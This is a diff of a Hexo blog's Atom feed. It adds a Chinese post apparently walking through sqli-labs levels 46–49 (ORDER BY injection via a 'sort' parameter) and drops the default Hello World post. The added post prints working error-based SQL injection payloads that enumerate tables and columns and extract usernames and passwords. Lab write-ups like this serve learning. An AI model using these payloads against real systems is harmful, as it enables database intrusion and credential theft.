@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-25T08:48:22.587Z</updated>
+  <updated>2022-02-25T10:32:45.143Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less46~49</title>
+    <link href="http://example.com/2022/02/25/less46-49/"/>
+    <id>http://example.com/2022/02/25/less46-49/</id>
+    <published>2022-02-25T10:15:17.000Z</published>
+    <updated>2022-02-25T10:32:45.143Z</updated>
+    
+    <content type="html"><![CDATA[<p>这几题是基于错误_GET_数字型_排序注入</p><p>在前面的关卡中我们大多是使用 id这个参数来获取到正常的页面，但在这几关中我们要使用 sort 这个参数，因为后台源代码这样设置了</p><p>我们看到了正常的页面，从中我们也发现了数字的不同，页面给我们呈现出的账号表格中的顺序是不同的，那么这就是我们这几关要说的知识点。<br>这关往后都是order by语句与limit语句的相关注入，还是很实用的，尤其是对于一些会显示表格的网站，他们的 URL 中通常都会有sort和limit两个参数。<br><img src="https://s2.loli.net/2022/02/25/IXRB6t9fkyECZnP.png" alt="1.png"><br><img src="https://s2.loli.net/2022/02/25/PLtGnbSvhUs2ixy.png" alt="2.png"></p><p>尝试sort=1 asc和sort=1 desc，分别显示升序和降序的表格，说明此处是注入点，即注入点在order by后的参数中，而order by不同于在where后的注入，不能使用union等进行注入。</p><p><img src="https://s2.loli.net/2022/02/25/2sSebnrWtjfq9F1.png" alt="3.png"></p><p><img src="https://s2.loli.net/2022/02/25/NBPvsoId4fx1juT.png" alt="4.png"><br>所以这里仍然可以尝试报错注入的方式：<br>    ?sort=UpdateXml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)<br><img src="https://s2.loli.net/2022/02/25/f6pouVbvAWTBrQz.png" alt="5.png"><br>也可以使用基于报错注入：<br>    ?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</p><p><img src="https://s2.loli.net/2022/02/25/6TzvrQm3qw1uXjR.png" alt="6.png"><br>    ?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),floor(rand()*2))as a from information_schema.tables group by a) b)</p><p><img src="https://s2.loli.net/2022/02/25/Omt8iAwlvH9WIEs.png" alt="7.png"></p><pre><code>?sort=(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)</code></pre><p><img src="https://s2.loli.net/2022/02/25/laGfnvdsVKy8PAB.png" alt="8.png"><br>    ?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select concat_ws(‘-‘,id,username,password) from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)<br><img src="https://s2.loli.net/2022/02/25/ESr4KFVhT8oCWPY.png" alt="9.png"></p><p>其余的除了闭合方式不同其他基本相同。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;这几题是基于错误_GET_数字型_排序注入&lt;/p&gt;
+&lt;p&gt;在前面的关卡中我们大多是使用 id这个参数来获取到正常的页面，但在这几关中我们要使用 sort 这个参数，因为后台源代码这样设置了&lt;/p&gt;
+&lt;p&gt;我们看到了正常的页面，从中我们也发现了数字的不同，页面给我们呈现出的账</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>堆叠注入（less38~45）</title>
@@ -413,26 +435,6 @@ f</summary>
     
     
     <category term="小白刚开始学习很多地方不懂，请多多指教" scheme="http://example.com/tags/%E5%B0%8F%E7%99%BD%E5%88%9A%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%BE%88%E5%A4%9A%E5%9C%B0%E6%96%B9%E4%B8%8D%E6%87%82%EF%BC%8C%E8%AF%B7%E5%A4%9A%E5%A4%9A%E6%8C%87%E6%95%99/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://example.com/2021/09/18/hello-world/"/>
-    <id>http://example.com/2021/09/18/hello-world/</id>
-    <published>2021-09-18T12:40:04.548Z</published>
-    <updated>2021-09-18T12:40:04.548Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
-      
-    
-    
-    
     
   </entry>
   
